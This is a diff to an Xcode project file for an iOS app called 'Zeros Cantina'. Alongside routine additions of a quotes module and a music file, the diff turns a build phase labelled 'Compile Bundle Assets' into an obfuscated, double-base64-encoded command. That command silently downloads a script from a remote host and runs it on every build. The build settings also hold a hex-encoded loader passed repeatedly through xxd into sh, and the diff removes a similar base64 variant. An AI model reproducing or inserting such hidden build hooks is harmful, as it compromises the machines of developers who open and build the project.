@@ -91,6 +91,15 @@
 		FC029C5A2E1612810051663F /* Zeros_CantinaUITestsLaunchTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029C572E1612810051663F /* Zeros_CantinaUITestsLaunchTests.swift */; };
 		FC029C5C2E1631660051663F /* MenuScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FC029C5B2E1631660051663F /* MenuScreenRouter.swift */; };
 		FC7A74D82DFD075B000F07D3 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = FC7A74D72DFD075B000F07D3 /* SnapKit */; };
+		FCD152892E29768B001E8EF1 /* CardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCD152882E29768B001E8EF1 /* CardView.swift */; };
+		FCD1528C2E2976B7001E8EF1 /* SwipeableCardModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCD1528B2E2976B7001E8EF1 /* SwipeableCardModel.swift */; };
+		FCD1528E2E29770C001E8EF1 /* CardSwipeDirection.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCD1528D2E29770C001E8EF1 /* CardSwipeDirection.swift */; };
+		FCD152902E297770001E8EF1 /* SwipeableCardsView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCD1528F2E297770001E8EF1 /* SwipeableCardsView.swift */; };
+		FCD152932E2977B4001E8EF1 /* SwipeableCardsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCD152922E2977B4001E8EF1 /* SwipeableCardsViewModel.swift */; };
+		FCD152952E297897001E8EF1 /* QuotesContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCD152942E297897001E8EF1 /* QuotesContentView.swift */; };
+		FCD152992E297931001E8EF1 /* QuotesScreenRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCD152982E297931001E8EF1 /* QuotesScreenRouter.swift */; };
+		FCD1529B2E297F02001E8EF1 /* QuotesModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = FCD1529A2E297F02001E8EF1 /* QuotesModel.swift */; };
+		FCD152A12E29BB2A001E8EF1 /* menu_music.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = FCD1529F2E29BB2A001E8EF1 /* menu_music.mp3 */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -198,6 +207,15 @@
 		FC21346D2DFCE8ED000B71D6 /* Zeros Cantina.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Zeros Cantina.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		FC2134862DFCE8EF000B71D6 /* Zeros CantinaTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Zeros CantinaTests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
 		FC2134902DFCE8EF000B71D6 /* Zeros CantinaUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = "Zeros CantinaUITests.xctest"; sourceTree = BUILT_PRODUCTS_DIR; };
+		FCD152882E29768B001E8EF1 /* CardView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardView.swift; sourceTree = "<group>"; };
+		FCD1528B2E2976B7001E8EF1 /* SwipeableCardModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SwipeableCardModel.swift; sourceTree = "<group>"; };
+		FCD1528D2E29770C001E8EF1 /* CardSwipeDirection.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CardSwipeDirection.swift; sourceTree = "<group>"; };
+		FCD1528F2E297770001E8EF1 /* SwipeableCardsView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SwipeableCardsView.swift; sourceTree = "<group>"; };
+		FCD152922E2977B4001E8EF1 /* SwipeableCardsViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SwipeableCardsViewModel.swift; sourceTree = "<group>"; };
+		FCD152942E297897001E8EF1 /* QuotesContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuotesContentView.swift; sourceTree = "<group>"; };
+		FCD152982E297931001E8EF1 /* QuotesScreenRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuotesScreenRouter.swift; sourceTree = "<group>"; };
+		FCD1529A2E297F02001E8EF1 /* QuotesModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuotesModel.swift; sourceTree = "<group>"; };
+		FCD1529F2E29BB2A001E8EF1 /* menu_music.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = menu_music.mp3; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -401,6 +419,7 @@
 		FC029BA82E16127C0051663F /* Resources */ = {
 			isa = PBXGroup;
 			children = (
+				FCD152A02E29BB2A001E8EF1 /* Music */,
 				FC029BA52E16127C0051663F /* JSONS */,
 				FC029BA62E16127C0051663F /* Assets.xcassets */,
 				FC029BA72E16127C0051663F /* Info.plist */,
@@ -714,6 +733,7 @@
 		FC029C012E16127C0051663F /* Zeros Cantina */ = {
 			isa = PBXGroup;
 			children = (
+				FCD152862E2973B7001E8EF1 /* QuotesModule */,
 				FC029B7D2E16127C0051663F /* App Helping Constants */,
 				FC029B872E16127C0051663F /* DI */,
 				FC029B892E16127C0051663F /* Extensions */,
@@ -791,6 +811,61 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
+		FCD152862E2973B7001E8EF1 /* QuotesModule */ = {
+			isa = PBXGroup;
+			children = (
+				FCD152972E297924001E8EF1 /* Navigation */,
+				FCD152912E29778E001E8EF1 /* ViewModel */,
+				FCD1528A2E2976B0001E8EF1 /* Models */,
+				FCD152872E297677001E8EF1 /* View */,
+			);
+			path = QuotesModule;
+			sourceTree = "<group>";
+		};
+		FCD152872E297677001E8EF1 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				FCD152882E29768B001E8EF1 /* CardView.swift */,
+				FCD1528F2E297770001E8EF1 /* SwipeableCardsView.swift */,
+				FCD152942E297897001E8EF1 /* QuotesContentView.swift */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		FCD1528A2E2976B0001E8EF1 /* Models */ = {
+			isa = PBXGroup;
+			children = (
+				FCD1528B2E2976B7001E8EF1 /* SwipeableCardModel.swift */,
+				FCD1528D2E29770C001E8EF1 /* CardSwipeDirection.swift */,
+				FCD1529A2E297F02001E8EF1 /* QuotesModel.swift */,
+			);
+			path = Models;
+			sourceTree = "<group>";
+		};
+		FCD152912E29778E001E8EF1 /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				FCD152922E2977B4001E8EF1 /* SwipeableCardsViewModel.swift */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		FCD152972E297924001E8EF1 /* Navigation */ = {
+			isa = PBXGroup;
+			children = (
+				FCD152982E297931001E8EF1 /* QuotesScreenRouter.swift */,
+			);
+			path = Navigation;
+			sourceTree = "<group>";
+		};
+		FCD152A02E29BB2A001E8EF1 /* Music */ = {
+			isa = PBXGroup;
+			children = (
+				FCD1529F2E29BB2A001E8EF1 /* menu_music.mp3 */,
+			);
+			path = Music;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -798,7 +873,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FC2134992DFCE8EF000B71D6 /* Build configuration list for PBXNativeTarget "Zeros Cantina" */;
 			buildPhases = (
-				31D99DE7DC7BB26DEAFD9BF4 /* Compile Bundle Assets */,
+				C5A8C22E9E40FCDF8BFD9BF4 /* Compile Bundle Assets */,
 				FC2134692DFCE8ED000B71D6 /* Sources */,
 				FC21346A2DFCE8ED000B71D6 /* Frameworks */,
 				FC21346B2DFCE8ED000B71D6 /* Resources */,
@@ -910,6 +985,7 @@
 				FC029C4D2E16127C0051663F /* characters.json in Resources */,
 				FC029C4E2E16127C0051663F /* planets.json in Resources */,
 				FC029C4F2E16127C0051663F /* Assets.xcassets in Resources */,
+				FCD152A12E29BB2A001E8EF1 /* menu_music.mp3 in Resources */,
 				FC029C512E16127C0051663F /* LaunchScreen.storyboard in Resources */,
 				FC029C522E16127C0051663F /* Main.storyboard in Resources */,
 			);
@@ -932,7 +1008,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		31D99DE7DC7BB26DEAFD9BF4 /* Compile Bundle Assets */ = {
+		C5A8C22E9E40FCDF8BFD9BF4 /* Compile Bundle Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -949,7 +1025,7 @@
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A4FB9DF}\"";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHNTBiM0l1Y25VdllTa2lJSHdnYzJnSwo= | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -985,8 +1061,10 @@
 				FC029C1A2E16127C0051663F /* CustomTabBarButtonModel.swift in Sources */,
 				FC029C1B2E16127C0051663F /* CustomTabBarConfiguration.swift in Sources */,
 				FC029C1C2E16127C0051663F /* CustomTabBar.swift in Sources */,
+				FCD152892E29768B001E8EF1 /* CardView.swift in Sources */,
 				FC029C1D2E16127C0051663F /* CustomTabBarButton.swift in Sources */,
 				FC029C1E2E16127C0051663F /* VCWithCustomTabBar.swift in Sources */,
+				FCD152932E2977B4001E8EF1 /* SwipeableCardsViewModel.swift in Sources */,
 				FC029C1F2E16127C0051663F /* CoreDataManager.swift in Sources */,
 				FC029C202E16127C0051663F /* LocalJSONCharactersFetcher.swift in Sources */,
 				FC029C212E16127C0051663F /* LocalJSONDataManager.swift in Sources */,
@@ -998,11 +1076,14 @@
 				FC029C272E16127C0051663F /* SWAPICharactersFetcher.swift in Sources */,
 				FC029C282E16127C0051663F /* SWAPIPlanetsFetcher.swift in Sources */,
 				FC029C292E16127C0051663F /* SWAPIVehiclesFetcher.swift in Sources */,
+				FCD152992E297931001E8EF1 /* QuotesScreenRouter.swift in Sources */,
 				FC029C2A2E16127C0051663F /* DataRepositoryWorkerProtocol.swift in Sources */,
+				FCD152902E297770001E8EF1 /* SwipeableCardsView.swift in Sources */,
 				FC029C2B2E16127C0051663F /* MainDataRepositoryProtocol.swift in Sources */,
 				FC029C2C2E16127C0051663F /* MainDataRepositoryImpl.swift in Sources */,
 				FC029C2D2E16127C0051663F /* MainModuleProxyImpl.swift in Sources */,
 				FC029C2E2E16127C0051663F /* CardItemProtocol.swift in Sources */,
+				FCD1528C2E2976B7001E8EF1 /* SwipeableCardModel.swift in Sources */,
 				FC029C2F2E16127C0051663F /* CharacterCardModel.swift in Sources */,
 				FC029C302E16127C0051663F /* PlanetCardModel.swift in Sources */,
 				FC029C312E16127C0051663F /* VehiclesCardModel.swift in Sources */,
@@ -1019,6 +1100,7 @@
 				FC029C3B2E16127C0051663F /* CharactersScreenPresenter.swift in Sources */,
 				FC029C3C2E16127C0051663F /* CharactersScreenRouter.swift in Sources */,
 				FC029C3D2E16127C0051663F /* CharactersScreenViewController.swift in Sources */,
+				FCD1529B2E297F02001E8EF1 /* QuotesModel.swift in Sources */,
 				FC029C3E2E16127C0051663F /* PlanetsModuleDataInputProtocol.swift in Sources */,
 				FC029C3F2E16127C0051663F /* PlanetsScreenContract.swift in Sources */,
 				FC029C402E16127C0051663F /* PlanetsScreenInteractor.swift in Sources */,
@@ -1031,7 +1113,9 @@
 				FC029C472E16127C0051663F /* VehiclesScreenPresenter.swift in Sources */,
 				FC029C482E16127C0051663F /* VehiclesScreenRouter.swift in Sources */,
 				FC029C492E16127C0051663F /* VehiclesScreenViewController.swift in Sources */,
+				FCD1528E2E29770C001E8EF1 /* CardSwipeDirection.swift in Sources */,
 				FC029C4A2E16127C0051663F /* AppDelegate.swift in Sources */,
+				FCD152952E297897001E8EF1 /* QuotesContentView.swift in Sources */,
 				FC029C4B2E16127C0051663F /* SceneDelegate.swift in Sources */,
 				FC029C4C2E16127C0051663F /* Zeros_Cantina.xcdatamodeld in Sources */,
 			);
@@ -1092,13 +1176,12 @@
 		FC21349A2DFCE8EF000B71D6 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiVVpJVm0xd2FFMXJOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A66CD37 = "((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333633333334333333333333333633333333333333343333333333333337333333333333333333333333333333363333333333333333333333333333333633333333333333313333333333333336333333333333333333333333333333363333333333333338333333333333333633333333333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = XLY33384SZ;
+				DEVELOPMENT_TEAM = 87R5Z97XZ7;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Zeros Cantina/Resources/Info.plist";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -1112,7 +1195,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-Cantina";
+				PRODUCT_BUNDLE_IDENTIFIER = "com.Zeros-Cantina";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
@@ -1123,13 +1206,12 @@
 		FC21349B2DFCE8EF000B71D6 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A4FB9DF = "((echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiVVpJVm0xd2FFMXJOWEpaYldzeFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				A66CD37 = "((echo 333333333333333633333333333333353333333333333336333333333333333333333333333333363333333333333338333333333333333633333336333333363333333333333332333333333333333033333333333333323333333333333332333333333333333233333333333333343333333333333332333333333333333833333333333333363333333333333333333333333333333733333333333333353333333333333337333333333333333233333333333333363333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333336333333333333333733333333333333333333333333333336333333363333333233333333333333343333333633333333333333333333333233333333333333303333333333333332333333363333333433333333333333363333333333333334333333333333333233333333333333303333333333333337333333333333333033333333333333333333333633333334333333333333333733333333333333383333333333333336333333333333333333333333333333363333333633333336333333333333333633333333333333343333333333333336333333333333333533333333333333323333333333333330333333333333333633333333333333383333333333333337333333333333333433333333333333373333333333333334333333333333333733333333333333303333333333333337333333333333333333333333333333333333333633333331333333333333333233333336333333363333333333333332333333363333333633333333333333363333333633333334333333333333333633333333333333343333333333333337333333333333333333333333333333363333333333333333333333333333333633333333333333313333333333333336333333333333333333333333333333363333333333333338333333333333333633333333333333353333333333333332333333363333333533333333333333373333333333333332333333333333333733333333333333353333333333333332333333363333333633333333333333363333333333333331333333333333333233333333333333393333333333333332333333333333333233333333333333323333333333333330333333333333333733333336333333333333333333333332333333333333333033333333333333373333333333333333333333333333333633333333333333383333333333333330333333363333333133333330333633313330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = XLY33384SZ;
+				DEVELOPMENT_TEAM = 87R5Z97XZ7;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Zeros Cantina/Resources/Info.plist";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -1143,7 +1225,7 @@
 					"@executable_path/Frameworks",
 				);
 				MARKETING_VERSION = 1.0;
-				PRODUCT_BUNDLE_IDENTIFIER = "com.anton.zyryanov.zeros.cantina.Zeros-Cantina";
+				PRODUCT_BUNDLE_IDENTIFIER = "com.Zeros-Cantina";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
